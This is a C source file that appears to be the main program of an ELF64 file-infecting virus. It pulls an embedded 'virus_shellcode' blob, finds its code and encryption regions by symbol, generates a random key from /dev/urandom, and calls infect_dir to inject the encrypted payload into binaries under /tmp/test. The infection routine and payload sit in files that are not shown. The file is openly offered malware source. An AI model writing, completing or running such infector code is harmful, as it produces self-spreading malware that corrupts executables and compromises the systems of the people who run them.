#include "lib/lib.h"
#include "lib/infect.h"

int usage(char *name){
	print("usage: ./");
	print(name);
	print(" [--force] [--key YOUR_PRIVATE_KEY] binary\n\nnote: the binary must be in elf64\n");
	return -1;
}

int randomize(char *k){
	int             fd;

	if ((fd = open("/dev/urandom", 0, 0)) == -1)
		return FALSE;
	read(fd, (char *)k, sizeof(*k)*16);
	return TRUE;
}

extern char KEY[16]; //defined in infect.c
extern char OLD_KEY[16]; //defined in infect.c

extern unsigned char virus_shellcode[];
extern unsigned int virus_shellcode_len;


int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
	println("VIRUS INFO");
	if (elf_check_valid(virus_shellcode, virus_shellcode_len) == FALSE) return FALSE;
	//Elf64_Ehdr *h = (void*)virus_shellcode;
	long long bin_start_off;
	long long bin_end_off;

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_end", &bin_end_off);
	(*v) = virus_shellcode + bin_start_off;
	(*l) = bin_end_off - bin_start_off; 
	printnbln(bin_start_off);
	printnbln(bin_end_off);

	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", c_off);
	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", c_len);
	(*c_len) = (*c_len)-(*c_off);
	(*c_off) -= bin_start_off; 
	printnbln(*c_off);
	printnbln(*c_len);


	return TRUE;
}

int main(int ac, char **av){
	(void)ac;
	(void)av;

	char *virus;
	size_t virus_len;
	size_t crypt_off;
	size_t crypt_len;
	get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len);
	
	randomize(KEY);
	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len);
}
